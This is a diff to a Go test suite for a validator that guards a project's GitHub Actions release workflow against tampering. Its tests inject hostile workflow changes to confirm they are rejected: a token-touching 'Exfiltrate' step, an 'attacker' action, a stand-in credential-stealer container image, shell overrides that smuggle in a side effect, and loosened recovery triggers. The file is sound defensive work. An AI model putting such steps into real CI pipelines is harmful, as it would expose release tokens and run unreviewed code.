@@ -203,7 +203,7 @@ func TestValidateReleaseWorkflowBoundaryRejectsExtraPublishCommand(t *testing.T)
 	t.Parallel()
 	root := t.TempDir()
 	workflow := validReleaseWorkflow + "      - name: Exfiltrate\n        env:\n          GH_TOKEN: ${{ github.token }}\n        run: printf '%s' \"$GH_TOKEN\" >/dev/null\n"
-	writeWorkflow(t, root, "release.yml", workflow)
+	writeReleaseWorkflows(t, root, workflow)
 	if err := validateReleaseWorkflowBoundary(root); err == nil || !strings.Contains(err.Error(), "canonical") {
 		t.Fatalf("validateReleaseWorkflowBoundary() error = %v, want canonical publication rejection", err)
 	}
@@ -213,7 +213,7 @@ func TestValidateReleaseWorkflowBoundaryRejectsExtraPublishAction(t *testing.T) 
 	t.Parallel()
 	root := t.TempDir()
 	workflow := strings.Replace(validReleaseWorkflow, "      - name: Publish GitHub release\n", "      - { uses: attacker/example@"+strings.Repeat("a", 40)+" }\n      - name: Publish GitHub release\n", 1)
-	writeWorkflow(t, root, "release.yml", workflow)
+	writeReleaseWorkflows(t, root, workflow)
 	if err := validateReleaseWorkflowBoundary(root); err == nil || !strings.Contains(err.Error(), "exactly") {
 		t.Fatalf("validateReleaseWorkflowBoundary() error = %v, want extra action rejection", err)
 	}
@@ -223,7 +223,7 @@ func TestValidateReleaseWorkflowBoundaryRejectsPublishDefaults(t *testing.T) {
 	t.Parallel()
 	root := t.TempDir()
 	workflow := strings.Replace(validReleaseWorkflow, "    runs-on: ubuntu-24.04\n    permissions:\n      contents: write", "    runs-on: ubuntu-24.04\n    defaults:\n      run:\n        shell: bash -c 'printf malicious-side-effect; bash {0}'\n    permissions:\n      contents: write", 1)
-	writeWorkflow(t, root, "release.yml", workflow)
+	writeReleaseWorkflows(t, root, workflow)
 	if err := validateReleaseWorkflowBoundary(root); err == nil || !strings.Contains(err.Error(), "unapproved key") {
 		t.Fatalf("validateReleaseWorkflowBoundary() error = %v, want publish defaults rejection", err)
 	}
@@ -233,7 +233,7 @@ func TestValidateReleaseWorkflowBoundaryRejectsPublishContainer(t *testing.T) {
 	t.Parallel()
 	root := t.TempDir()
 	workflow := strings.Replace(validReleaseWorkflow, "    runs-on: ubuntu-24.04\n    permissions:\n      contents: write", "    runs-on: ubuntu-24.04\n    container: attacker.invalid/credential-stealer:latest\n    permissions:\n      contents: write", 1)
-	writeWorkflow(t, root, "release.yml", workflow)
+	writeReleaseWorkflows(t, root, workflow)
 	if err := validateReleaseWorkflowBoundary(root); err == nil || !strings.Contains(err.Error(), "unapproved key") {
 		t.Fatalf("validateReleaseWorkflowBoundary() error = %v, want publish container rejection", err)
 	}
@@ -243,7 +243,7 @@ func TestValidateReleaseWorkflowBoundaryRejectsPublicationShell(t *testing.T) {
 	t.Parallel()
 	root := t.TempDir()
 	workflow := strings.Replace(validReleaseWorkflow, "      - name: Publish GitHub release\n        env:", "      - name: Publish GitHub release\n        shell: bash -c 'printf malicious-side-effect; bash {0}'\n        env:", 1)
-	writeWorkflow(t, root, "release.yml", workflow)
+	writeReleaseWorkflows(t, root, workflow)
 	if err := validateReleaseWorkflowBoundary(root); err == nil || !strings.Contains(err.Error(), "unapproved key") {
 		t.Fatalf("validateReleaseWorkflowBoundary() error = %v, want publication shell rejection", err)
 	}
@@ -252,10 +252,42 @@ func TestValidateReleaseWorkflowBoundaryRejectsPublicationShell(t *testing.T) {
 func TestValidateReleaseWorkflowBoundaryAcceptsCanonicalWorkflow(t *testing.T) {
 	t.Parallel()
 	root := t.TempDir()
-	writeWorkflow(t, root, "release.yml", validReleaseWorkflow)
+	writeReleaseWorkflows(t, root, validReleaseWorkflow)
 	if err := validateReleaseWorkflowBoundary(root); err != nil {
 		t.Fatal(err)
 	}
+}
+
+func TestValidateReleaseWorkflowBoundaryRejectsRecoveryWeakening(t *testing.T) {
+	t.Parallel()
+	for _, test := range []struct {
+		name string
+		old  string
+		new  string
+	}{
+		{name: "direct branch push", old: "tags: [\"v*\"]", new: "tags: [\"v*\"]\n    branches: [release-recovery/v0.1.0]"},
+		{name: "broad recovery branch", old: "branches: [release-recovery/v0.1.0]", new: "branches: [release-recovery/*]"},
+		{name: "failed upstream accepted", old: "github.event.workflow_run.conclusion == 'success'", new: "github.event.workflow_run.conclusion != ''"},
+		{name: "mutable recovery checkout", old: "'refs/tags/v0.1.0'", new: "github.event.workflow_run.head_sha"},
+		{name: "branch-derived publish tag", old: "RAW_TAG: ${{ needs.build.outputs.tag }}", new: "RAW_TAG: ${{ github.ref_name }}"},
+	} {
+		test := test
+		t.Run(test.name, func(t *testing.T) {
+			t.Parallel()
+			root := t.TempDir()
+			workflow := strings.Replace(validReleaseWorkflow, test.old, test.new, 1)
+			writeReleaseWorkflows(t, root, workflow)
+			if err := validateReleaseWorkflowBoundary(root); err == nil {
+				t.Fatal("validateReleaseWorkflowBoundary() accepted weakened recovery workflow")
+			}
+		})
+	}
+}
+
+func writeReleaseWorkflows(t *testing.T, root, release string) {
+	t.Helper()
+	writeWorkflow(t, root, "ci.yml", "name: CI\non:\n  push:\n    branches: [main, release-recovery/v0.1.0]\n  pull_request:\n")
+	writeWorkflow(t, root, "release.yml", release)
 }
 
 func writeWorkflow(t *testing.T, root, name, contents string) {
@@ -270,14 +302,34 @@ func writeWorkflow(t *testing.T, root, name, contents string) {
 }
 
 const validReleaseWorkflow = `name: Release
+on:
+  push:
+    tags: ["v*"]
+  workflow_run:
+    workflows: [CI]
+    types: [completed]
+    branches: [release-recovery/v0.1.0]
 permissions:
   contents: read
 jobs:
   build:
+    if: >-
+      github.event_name == 'push' ||
+      (github.event.workflow_run.conclusion == 'success' &&
+       github.event.workflow_run.event == 'push' &&
+       github.event.workflow_run.head_repository.full_name == github.repository &&
+       github.event.workflow_run.head_branch == 'release-recovery/v0.1.0' &&
+       github.event.workflow_run.head_sha == github.workflow_sha)
     runs-on: ubuntu-24.04
     outputs:
       tag: ${{ steps.target.outputs.tag }}
-    steps: []
+    steps:
+      - name: Check out repository
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
+        with:
+          fetch-depth: 0
+          persist-credentials: false
+          ref: ${{ github.event_name == 'workflow_run' && 'refs/tags/v0.1.0' || github.ref }}
   publish:
     needs: build
     runs-on: ubuntu-24.04
